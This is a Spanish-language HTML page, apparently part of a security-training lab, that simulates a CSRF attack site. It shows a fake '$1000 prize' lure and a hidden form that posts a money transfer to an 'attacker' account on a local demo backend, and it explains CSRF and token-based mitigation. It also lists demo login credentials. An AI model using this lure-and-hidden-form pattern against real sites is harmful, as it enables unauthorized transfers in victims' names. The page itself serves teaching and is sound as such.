<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üéÅ ¬°Gana $1000 Gratis! - CSRF Demo</title>
  <script src="config.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 2rem;
    }

    .container {
      max-width: 800px;
      margin: 0 auto;
    }

    .warning-header {
      background: #dc3545;
      color: white;
      padding: 1rem 2rem;
      border-radius: 10px 10px 0 0;
      text-align: center;
    }

    .card {
      background: white;
      padding: 2rem;
      border-radius: 0 0 10px 10px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
    }

    .fake-offer {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      padding: 3rem 2rem;
      border-radius: 15px;
      text-align: center;
      color: white;
      margin-bottom: 2rem;
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {

      0%,
      100% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.05);
      }
    }

    .fake-offer h1 {
      font-size: 2.5rem;
      margin-bottom: 1rem;
      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
    }

    .fake-offer p {
      font-size: 1.2rem;
      margin-bottom: 1.5rem;
    }

    .btn-claim {
      background: #ffc107;
      color: #000;
      border: none;
      padding: 1rem 3rem;
      font-size: 1.5rem;
      border-radius: 50px;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 4px 15px rgba(255, 193, 7, 0.4);
      transition: all 0.3s;
    }

    .btn-claim:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(255, 193, 7, 0.6);
    }

    .explanation {
      background: #fff3cd;
      border: 2px solid #ffc107;
      padding: 1.5rem;
      border-radius: 10px;
      margin-top: 2rem;
    }

    .explanation h3 {
      color: #856404;
      margin-bottom: 1rem;
    }

    .explanation ul {
      list-style: none;
      padding: 0;
    }

    .explanation li {
      padding: 0.5rem 0;
      padding-left: 1.5rem;
      position: relative;
    }

    .explanation li:before {
      content: "‚ö†Ô∏è";
      position: absolute;
      left: 0;
    }

    .code-box {
      background: #2d2d44;
      color: #4af626;
      padding: 1rem;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
      font-size: 0.9rem;
      overflow-x: auto;
      margin: 1rem 0;
    }

    .hidden-form {
      display: none;
    }

    .attack-log {
      background: #1e1e2e;
      color: #4af626;
      padding: 1rem;
      border-radius: 8px;
      font-family: 'Courier New', monospace;
      font-size: 0.85rem;
      margin-top: 1rem;
      max-height: 200px;
      overflow-y: auto;
    }

    .log-entry {
      margin: 0.25rem 0;
    }

    .success {
      color: #4af626;
    }

    .error {
      color: #ff4444;
    }

    .info {
      color: #3498db;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="warning-header">
      <h2>üö® CSRF Attack Simulation - Sitio Malicioso</h2>
      <p>Esta es una demostraci√≥n educativa de un ataque CSRF</p>
    </div>

    <div class="card">
      <!-- Fake Offer -->
      <div class="fake-offer">
        <h1>üéÅ ¬°FELICIDADES!</h1>
        <p>¬°Has sido seleccionado para ganar $1000 GRATIS!</p>
        <p>Haz clic abajo para reclamar tu premio</p>
        <button class="btn-claim" onclick="claimPrize()">
          üéâ ¬°RECLAMAR MI PREMIO! üéâ
        </button>
      </div>

      <!-- Hidden CSRF Form -->
      <form id="csrfForm" class="hidden-form" action="" method="POST">
        <input name="toUser" value="attacker">
        <input name="amount" value="1000">
      </form>

      <!-- Explanation -->
      <div class="explanation">
        <h3>üîç ¬øQu√© Est√° Pasando Aqu√≠?</h3>
        <p>Este es un <strong>sitio malicioso</strong> que simula un ataque CSRF.</p>

        <p><strong>‚ö†Ô∏è IMPORTANTE - Punto Educativo:</strong></p>
        <ul>
          <li><strong>CSRF real funciona con COOKIES</strong>, no con JWT en localStorage</li>
          <li>Las cookies se env√≠an autom√°ticamente en cada petici√≥n</li>
          <li>JWT en Authorization header requiere JavaScript expl√≠cito</li>
          <li>Same-Origin Policy impide que un sitio (localhost:3002) lea localStorage de otro (localhost:3100)</li>
          <li><strong>Esto es CORRECTO por seguridad</strong></li>
        </ul>

        <p><strong>üéì En un CSRF real con cookies:</strong></p>
        <ul>
          <li>Usuario est√° autenticado con cookies en banco.com</li>
          <li>Usuario visita sitio-malicioso.com</li>
          <li>Sitio malicioso env√≠a formulario a banco.com</li>
          <li>Navegador incluye cookies autom√°ticamente</li>
          <li>Banco ejecuta transferencia sin verificar origen</li>
        </ul>

        <p><strong>üí° Para ver el ataque en acci√≥n:</strong></p>
        <ul>
          <li>Usa el demo directamente en <code>localhost:3100/vulnerabilities/csrf</code></li>
          <li>Este sitio atacante sirve para ENTENDER el concepto</li>
        </ul>
      </div>

      <!-- Attack Code -->
      <div class="code-box" id="attackCode">
        &lt;!-- C√≥digo del Ataque CSRF --&gt;<br>
        &lt;form id="csrfForm" action="<span id="codeBackendUrl">...</span>/api/vulnerable/csrf/transfer-money"
        method="POST"&gt;<br>
        &nbsp;&nbsp;&lt;input name="toUser" value="attacker"&gt;<br>
        &nbsp;&nbsp;&lt;input name="amount" value="1000"&gt;<br>
        &lt;/form&gt;<br>
        <br>
        &lt;script&gt;<br>
        &nbsp;&nbsp;// Usuario hace clic en bot√≥n "inocente"<br>
        &nbsp;&nbsp;document.getElementById('csrfForm').submit();<br>
        &lt;/script&gt;
      </div>

      <!-- Attack Log -->
      <div class="attack-log" id="attackLog">
        <div class="log-entry info">üíª Sitio malicioso cargado...</div>
        <div class="log-entry info">‚è≥ Esperando interacci√≥n del usuario...</div>
      </div>

      <!-- Mitigation -->
      <div class="explanation">
        <h3>üõ°Ô∏è C√≥mo Protegerse</h3>
        <p><strong>Versi√≥n Vulnerable:</strong></p>
        <ul>
          <li>Solo verifica autenticaci√≥n (JWT/Cookie)</li>
          <li>NO verifica el origen de la petici√≥n</li>
          <li>Cualquier sitio puede hacer la petici√≥n</li>
        </ul>
        <br>
        <p><strong>Versi√≥n Segura:</strong></p>
        <ul>
          <li>Genera token CSRF √∫nico por sesi√≥n</li>
          <li>Token guardado en el cliente (NO en cookie)</li>
          <li>Servidor valida token en cada petici√≥n cr√≠tica</li>
          <li>Sitios maliciosos NO pueden obtener el token</li>
        </ul>
      </div>
    </div>
  </div>

  <script>
    function addLog(message, type = 'info') {
      const log = document.getElementById('attackLog');
      const entry = document.createElement('div');
      entry.className = `log-entry ${type}`;
      entry.textContent = message;
      log.appendChild(entry);
      log.scrollTop = log.scrollHeight;
    }

    async function claimPrize() {
      console.log('claimPrize');
      addLog('üéØ Usuario hizo clic en el bot√≥n...', 'info');
      addLog('üì§ Enviando formulario oculto CSRF...', 'info');

      // Wait for config to be loaded
      const config = await waitForConfig();
      const form = document.getElementById('csrfForm');
      const formData = new FormData(form);

      const response = await fetch(`${config.backendUrl}/api/vulnerable/csrf/transfer-money`, {
        method: 'POST',
        body: JSON.stringify({
          toUser: formData.get('toUser'),
          amount: parseInt(formData.get('amount'))
        }),
        headers: {
          'Content-Type': 'application/json',
        },
        credentials: 'include'
      });

      const data = await response.json();

      if (response.ok && data.success) {
        addLog('‚úÖ ¬°Ataque CSRF exitoso!', 'success');
        addLog(`üí∏ ${data.message}`, 'success');
        addLog('‚ö†Ô∏è ' + (data.warning || 'Transferencia completada sin CSRF protection'), 'error');

        // Fake prize message
        setTimeout(() => {
          alert('üéâ ¬°Felicidades! Tu "premio" ha sido procesado... üòà\n\n(En realidad acabas de transferir $1000 al atacante debido a CSRF)');
        }, 1000);
      } else {
        addLog('‚ùå Ataque bloqueado: ' + (data.error || 'Error desconocido'), 'error');
        if (response.status === 401) {
          addLog('‚ÑπÔ∏è Necesitas estar autenticado primero', 'info');
          addLog('‚ÑπÔ∏è Ve a Authentication Failures y haz login con admin:admin123', 'info');
        }
      }
    }

    // Initialize on load
    window.addEventListener('configLoaded', () => {
      // Update form action
      const form = document.getElementById('csrfForm');
      form.action = `${CONFIG.backendUrl}/api/vulnerable/csrf/transfer-money`;

      // Update code display
      document.getElementById('codeBackendUrl').textContent = CONFIG.backendUrl;

      addLog('üïµÔ∏è Sitio malicioso listo para atacar...', 'info');
      addLog(`üéØ Target: ${CONFIG.backendUrl}`, 'info');
    });
  </script>
</body>

</html>